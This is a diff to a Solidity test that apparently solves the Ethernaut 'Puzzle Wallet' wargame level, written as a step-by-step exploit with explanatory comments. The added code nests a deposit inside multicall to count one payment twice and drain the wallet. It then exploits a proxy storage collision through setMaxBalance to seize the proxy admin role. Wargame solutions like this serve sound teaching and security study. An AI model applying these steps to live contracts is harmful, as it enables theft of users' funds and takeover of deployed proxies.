@@ -8,6 +8,10 @@ contract PuzzleWalletTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     address eoaAddress = address(100);
 
+    // Memory cannot hold dynamic byte arrays must be storage
+    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
+    bytes[] multicallData = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];
+
     event IsTrue(bool answer);
 
     function setUp() public {
@@ -27,8 +31,6 @@ contract PuzzleWalletTest is DSTest {
         
         vm.startPrank(eoaAddress);
         
-        
-
         //////////////////
         // LEVEL ATTACK //
         //////////////////
@@ -44,25 +46,27 @@ contract PuzzleWalletTest is DSTest {
         ethernautPuzzleWallet.addToWhitelist(levelAddressWallet);
         emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
 
-        bytes memory data1 = abi.encode(abi.encodeWithSignature("deposit()"));
-        bytes memory data2 = abi.encode(abi.encodeWithSignature("multicall(bytes[])", [data1]));
+        // Call multicall with multicallData above enables us to double deposit 
+        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);
 
-        // bytes memory data3 = abi.encode(
-        //     data1,
-        //     data2
-        // );
+        // Withdraw funds so balance of contract is 0 
+        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, bytes(""));
 
-        // bytes[] memory data3 = [data1, data2];
+        // Check who current admin is of proxy
+        assertTrue((ethernautPuzzleProxy.admin() != eoaAddress));
 
 
-        // ethernautPuzzleWallet.multicall{value: 1 ether}([data1, data2]);
+        // Set max balance to your address, there's no separation between the storage layer of the proxy 
+        // and the puzzle wallet - this means when you to maxbalance (slot 1) you also write to the proxy admin variable 
+        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));
 
+        
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
 
-        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        // Verify We have become admin
+        assertTrue((ethernautPuzzleProxy.admin() == eoaAddress));
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
     }
 }
